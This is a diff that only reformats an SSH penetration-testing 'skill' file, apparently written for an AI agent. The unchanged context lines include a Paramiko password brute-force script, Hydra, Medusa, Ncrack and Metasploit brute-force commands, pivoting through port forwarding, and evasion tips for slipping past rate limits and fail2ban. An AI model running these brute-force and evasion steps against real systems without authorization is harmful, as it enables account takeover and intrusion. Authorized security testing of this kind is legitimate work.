@@ -1,20 +1,28 @@
 ---
 name: SSH Penetration Testing
-description: This skill should be used when the user asks to "pentest SSH services", "enumerate SSH configurations", "brute force SSH credentials", "exploit SSH vulnerabilities", "perform SSH tunneling", or "audit SSH security". It provides comprehensive SSH penetration testing methodologies and techniques.
+description:
+  This skill should be used when the user asks to "pentest SSH services",
+  "enumerate SSH configurations", "brute force SSH credentials", "exploit SSH
+  vulnerabilities", "perform SSH tunneling", or "audit SSH security". It
+  provides comprehensive SSH penetration testing methodologies and techniques.
 metadata:
   author: zebbern
-  version: "1.1"
+  version: '1.1'
 ---
 
 # SSH Penetration Testing
 
 ## Purpose
 
-Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.
+Conduct comprehensive SSH security assessments including enumeration, credential
+attacks, vulnerability exploitation, tunneling techniques, and post-exploitation
+activities. This skill covers the complete methodology for testing SSH service
+security.
 
 ## Prerequisites
 
 ### Required Tools
+
 - Nmap with SSH scripts
 - Hydra or Medusa for brute-forcing
 - ssh-audit for configuration analysis
@@ -22,6 +30,7 @@ Conduct comprehensive SSH security assessments including enumeration, credential
 - Python with Paramiko library
 
 ### Required Knowledge
+
 - SSH protocol fundamentals
 - Public/private key authentication
 - Port forwarding concepts
@@ -97,6 +106,7 @@ ssh-audit -p 2222 192.168.1.100
 ```
 
 Key configuration weaknesses to identify:
+
 - Weak key exchange algorithms (diffie-hellman-group1-sha1)
 - Weak ciphers (arcfour, 3des-cbc)
 - Weak MACs (hmac-md5, hmac-sha1-96)
@@ -338,7 +348,7 @@ def ssh_connect(host, username, password):
     """Attempt SSH connection with credentials"""
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    
+
     try:
         client.connect(host, username=username, password=password, timeout=5)
         print(f"[+] Success: {username}:{password}")
@@ -361,7 +371,7 @@ def ssh_brute_force(host, username, wordlist):
     """Brute-force SSH with wordlist"""
     with open(wordlist, 'r') as f:
         passwords = f.read().splitlines()
-    
+
     for password in passwords:
         client = ssh_connect(host, username, password.strip())
         if client:
@@ -376,7 +386,7 @@ def ssh_brute_force(host, username, wordlist):
 if __name__ == "__main__":
     target = "192.168.1.100"
     user = "admin"
-    
+
     # Single credential test
     client = ssh_connect(target, user, "password123")
     if client:
@@ -427,53 +437,56 @@ sessions -i 1
 
 ### SSH Enumeration Commands
 
-| Command | Purpose |
-|---------|---------|
-| `nc <host> 22` | Banner grabbing |
-| `ssh-audit <host>` | Configuration audit |
-| `nmap --script ssh*` | SSH NSE scripts |
-| `searchsploit openssh` | Find exploits |
+| Command                | Purpose             |
+| ---------------------- | ------------------- |
+| `nc <host> 22`         | Banner grabbing     |
+| `ssh-audit <host>`     | Configuration audit |
+| `nmap --script ssh*`   | SSH NSE scripts     |
+| `searchsploit openssh` | Find exploits       |
 
 ### Brute-Force Options
 
-| Tool | Command |
-|------|---------|
-| Hydra | `hydra -l user -P pass.txt ssh://host` |
-| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
-| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
-| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |
+| Tool       | Command                                      |
+| ---------- | -------------------------------------------- |
+| Hydra      | `hydra -l user -P pass.txt ssh://host`       |
+| Medusa     | `medusa -h host -u user -P pass.txt -M ssh`  |
+| Ncrack     | `ncrack -p 22 --user admin -P pass.txt host` |
+| Metasploit | `use auxiliary/scanner/ssh/ssh_login`        |
 
 ### Port Forwarding Types
 
-| Type | Command | Use Case |
-|------|---------|----------|
-| Local | `-L 8080:target:80` | Access remote services locally |
-| Remote | `-R 8080:localhost:80` | Expose local services remotely |
-| Dynamic | `-D 1080` | SOCKS proxy for pivoting |
+| Type    | Command                | Use Case                       |
+| ------- | ---------------------- | ------------------------------ |
+| Local   | `-L 8080:target:80`    | Access remote services locally |
+| Remote  | `-R 8080:localhost:80` | Expose local services remotely |
+| Dynamic | `-D 1080`              | SOCKS proxy for pivoting       |
 
 ### Common SSH Ports
 
-| Port | Description |
-|------|-------------|
-| 22 | Default SSH |
-| 2222 | Common alternate |
+| Port  | Description       |
+| ----- | ----------------- |
+| 22    | Default SSH       |
+| 2222  | Common alternate  |
 | 22222 | Another alternate |
-| 830 | NETCONF over SSH |
+| 830   | NETCONF over SSH  |
 
 ## Constraints and Limitations
 
 ### Legal Considerations
+
 - Always obtain written authorization
 - Brute-forcing may violate ToS
 - Document all testing activities
 
 ### Technical Limitations
+
 - Rate limiting may block attacks
 - Fail2ban or similar may ban IPs
 - Key-based auth prevents password attacks
 - Two-factor authentication adds complexity
 
 ### Evasion Techniques
+
 - Use slow brute-force: `-t 1 -w 5`
 - Distribute attacks across IPs
 - Use timing-based enumeration carefully
@@ -481,8 +494,8 @@ sessions -i 1
 
 ## Troubleshooting
 
-| Issue | Solutions |
-|-------|-----------|
-| Connection Refused | Verify SSH running; check firewall; confirm port; test from different IP |
+| Issue                   | Solutions                                                                             |
+| ----------------------- | ------------------------------------------------------------------------------------- |
+| Connection Refused      | Verify SSH running; check firewall; confirm port; test from different IP              |
 | Authentication Failures | Verify username; check password policy; key permissions (600); authorized_keys format |
-| Tunnel Not Working | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v` |
+| Tunnel Not Working      | Check GatewayPorts/AllowTcpForwarding in sshd_config; verify firewall; use `ssh -v`   |
